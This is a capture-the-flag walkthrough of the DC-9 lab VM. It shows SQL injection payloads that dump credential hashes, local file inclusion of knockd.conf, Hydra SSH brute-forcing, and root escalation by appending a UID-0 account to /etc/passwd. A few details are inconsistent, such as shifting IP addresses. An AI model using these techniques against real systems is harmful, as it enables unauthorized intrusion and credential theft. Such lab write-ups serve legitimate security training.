Phase 1: Reconnaissance

After importing the DC-9 machine into VirtualBox, the first step was identifying its IP address within my local network. I used `netdiscover` to find the target.

sudo netdiscover -i eth0

**Target IP:** `192.168.56.122`

With the target identified, I ran an Nmap scan to enumerate open ports and services.

nmap -p- `192.168.56.122`

**Scan Results:**

- **Port 80 (HTTP):** Open
- **Port 22 (SSH):** ==Filtered==

The “Filtered” status on SSH was a hint. It usually suggests a firewall rule or, more likely in CTF contexts, a **Port Knocking** mechanism. Since we couldn’t interact with SSH yet, I focused my attention on the web server running on Port 80.


## Phase 2: Web Enumeration and SQL Injection

Exploring the website, I found a search page allowing users to search for staff records. Search fields are classic vectors for SQL Injection (SQLi), so I fired up **Burp Suite** to intercept the request.

![](https://miro.medium.com/v2/resize:fit:875/1*X_0w-bP7FSH1cg1M595fDw.png)

I captured the search request and sent it to the **Repeater** tab. To test for vulnerabilities, I injected a basic Boolean payload into the search parameter:

' or 1=1-- -


![](https://miro.medium.com/v2/resize:fit:875/1*_OR4esNiD6WM9v5H7my3-g.png)

The server responded by listing all staff records. This confirmed the search field was vulnerable to SQL Injection.

## Database Enumeration

Next, I needed to determine the number of columns in the current table to construct a valid `UNION` query. Through trial and error, I found the correct number was **6**.

**Identifying Columns:**

' UNION SELECT 1,2,3,4,5,6 --

###### Retrieving Database Names
' UNION SELECT 1,2,3,4,5,schema_name FROM information_schema.schemata-- -

==information_schema,Staff,users==

##### Retrieving Tables from the ‘Staff’ Database
search='+UNION+SELECT+1,2,3,4,5,concat(table_name)+FROM+information_schema.tables+WHERE+table_schema+%3d+'Staff'+#

==StaffDetails,Users==

##### Dumping User Credentials

search='+UNION+SELECT+1,2,3,4,5,group_concat(username,+"|"+,password)+FROM+Staff.Users+#
![[Pasted image 20260930145853.png]]

==`admin` | `856f5de590ef37314e7c3bdf6f8a66dc


![](https://miro.medium.com/v2/resize:fit:875/1*g9v7ECbxSjQHnBFrC05g3w.png)

This query returned several credentials. However, one stood out from the `Staff` database as well:

**Admin Credential Found:** `admin` | `856f5de590ef37314e7c3bdf6f8a66dc`

I used **CrackStation** to identify the hash type (MD5) and crack it.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*IjcTHwL082_ngYKSN5vNHQ.png)

**Password:** `transorbital1`

## Phase 3: Port Knocking and LFI

With the admin credentials, I logged into the “Manage Records” panel on the website. While exploring the dashboard, I noticed the URL structure looked suspect when loading files. I tested for **Local File Inclusion (LFI)**, and it worked.

``

![](https://miro.medium.com/v2/resize:fit:875/1*gmk1qYfTuWTvB7QCFiy7ig.png)

Remembering the “Filtered” SSH port from my Nmap scan, I suspected `knockd` was installed. I used the LFI vulnerability to read the configuration file:

/etc/knockd.conf

![](https://miro.medium.com/v2/resize:fit:875/1*DoOGpwO8HJQaUVwzSl31Ew.png)

The file revealed the hidden port knocking sequence required to open port 22: **Sequence:** `7469, 8475, 9842`

I performed the knock sequence from my attacker machine:

knock 192.168.56.122 7469 8475 9842

![](https://miro.medium.com/v2/resize:fit:411/1*7gR5uX7U2QIxGhIegawMkg.png)

Running Nmap again confirmed that **Port 22 was now OPEN**.

![](https://miro.medium.com/v2/resize:fit:833/1*oGNh9f82J0PAl_1FEsUHgw.png)

## Phase 4: Gaining Access (SSH)

During the SQL injection phase, I had dumped a list of usernames and password hashes. I saved the usernames to `usersdc6.txt` and the passwords to `passwordsdc6.txt`.

Using **Hydra**, I brute-forced the SSH login:

`hydra -L usersdc6.txt -P passwordsdc6.txt 192.168.56.122 ssh

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*XUdO3IG9TXjmYpHrjNDZuQ.png)

Hydra successfully found credentials for the users **janitor,joeyt,chandlerb**.

`ssh janitor@dc-9

![](https://miro.medium.com/v2/resize:fit:796/1*79B82F3uapW_Fb3v3VQxbQ.png)

## Lateral Movement

Once inside as `janitor`, I listed the directories and found a suspicious folder named `.secrets-for-putin`. inside, there was a password list.

![](https://miro.medium.com/v2/resize:fit:796/1*z8EVJ87gz-csuialkRwq6w.png)


```
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

then i added these to the `passwordsdc6.txt` and again ran the hydra command

![](https://miro.medium.com/v2/resize:fit:875/1*VFYDt1Syp2zlUhOjPLb1Xg.png)

This time, I cracked the password for the users **fredf** and **jeoyt**.

ssh fredf@10.0.3.7

![](https://miro.medium.com/v2/resize:fit:815/1*NMmUtZ2jWymTQX_3tIeCgw.png)

## Phase 5: Privilege Escalation to Root

Logged in as `fredf`, I checked for sudo privileges:

sudo -l

![](https://miro.medium.com/v2/resize:fit:875/1*GNNL110eVkNVqu900Qy6-w.png)

I had  root permission to run a specific binary located at `/opt/devstuff/dist/test/test` as root. Running the binary revealed it was a program that reads a file and **appends** data to another file.

![](https://miro.medium.com/v2/resize:fit:439/1*QundHVQC1CTYtowDkXQPxQ.png)

Since I could append data to _any_ file as root, I decided to add a new root user to `/etc/passwd`.

```
root:x:0:0:root:/root:/bin/bash
and to create a new user as hacker
hacker:x:0:0:root:/root:/bin/bash
```

1. **Generate a Password Hash:** I created an MD5 hash for my new password (“test1”):

```
┌──(kali㉿hashi)-[~]
└─$ openssl passwd -1 hack <password=hack>  
$1$.xgoJ/TK$VwdRAisRNdxwDhAWHRLZP1
```


**2. Format the /etc/passwd Entry:** I constructed the entry following the format `user:pass:uid:gid:info:home:shell`. I set the UID and GID to `0` (root).

echo 'test1:$1$test1$ozp/y8w8y.z1.1/s1.1:0:0::/root:/bin/bash' > /tmp/new_user

`hacker:$1$.xgoJ/TK$VwdRAisRNdxwDhAWHRLZP1:0:0:root:/root:/bin/bash`

![](https://miro.medium.com/v2/resize:fit:875/1*svjhgjBainKK73CnyC05hw.png)

**3. Exploit the Sudo Binary:** I used the vulnerable binary to append my new user entry into `/etc/passwd`.

```
fredf@dc-9:~$ nano /tmp/ak
fredf@dc-9:~$ ls -l /tmp
total 20
-rw-r--r-- 1 fredf   fredf     67 Sep 30 07:59 ak

fredf@dc-9:~$ cd /opt/devstuff/dist/test/

fredf@dc-9:/opt/devstuff/dist/test$ sudo ./test /tmp/ak /etc/passwd
```

transfer the newly created ak file to the /etc/passwd  and run it as root 

```
fredf@dc-9:/opt/devstuff/dist/test$ cat /etc/passwd
hacker:$1$.xgoJ/TK$VwdRAisRNdxwDhAWHRLZP1:0:0:root:/root:/bin/bash

fredf@dc-9:/opt/devstuff/dist/test$ su hacker
Password: 
root@dc-9:/opt/devstuff/dist/test# cd /root
root@dc-9:~# cd /root
root@dc-9:~# ls
theflag.txt
root@dc-9:~# cat theflag.txt


███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
                                                                             
Congratulations - you have done well to get to this point.

```



![[Pasted image 20260930174400.png]]

